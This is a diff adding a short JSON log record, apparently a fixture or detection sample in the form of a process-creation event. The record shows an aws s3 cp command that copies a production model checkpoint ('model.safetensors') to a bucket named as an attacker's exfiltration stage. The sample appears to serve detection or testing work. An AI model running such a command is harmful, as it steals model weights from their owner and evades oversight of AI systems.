@@ -1,0 +1,8 @@
+{
+  "EventID": 1,
+  "UtcTime": "2026-09-05 15:03:00.000",
+  "ParentImage": "/bin/bash",
+  "Image": "/usr/local/bin/aws",
+  "CommandLine": "aws s3 cp s3://ai-training-checkpoints-prod/model.safetensors s3://attacker-exfil.stage.invalid/weights/ --expected-size 50000000000",
+  "User": "ec2-user"
+}
